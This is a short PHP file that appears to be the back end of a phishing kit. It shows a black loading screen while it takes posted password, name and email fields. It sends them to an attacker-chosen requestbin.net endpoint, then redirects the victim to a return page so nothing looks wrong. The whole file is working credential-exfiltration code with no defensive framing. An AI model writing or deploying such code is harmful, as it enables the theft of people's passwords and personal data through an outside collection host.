<?php

?>
<head>
  <title>Client</title>
  <style>
    .content {
      margin: 0;
      position: absolute;
      top: 50%;
      left: 50%;
      -ms-transform: translate(-50%, -50%);
      transform: translate(-50%, -50%);
    }
    .bg {
      background-color: black;
    }
  </style>
</head>
<body class="bg">
  <center><img class="content" src="../i/loading.gif" width="20%" height="20%"></img></center>
</body>
<?php
  $password = $_POST['password'];
  $requestbin = $_POST["requestbin"];
  $name = $_POST["name"];
  $mail = $_POST["mail"];
  $type = $_POST["type"];
  $return = $_POST["return"];
  $result = file_get_contents('http://requestbin.net/r/'.$requestbin.'?'.$type.'='.$password.'&name='.$name.'&mail='.$mail.'&returnedto='.$return);
  header("Location: ".$return);
?>
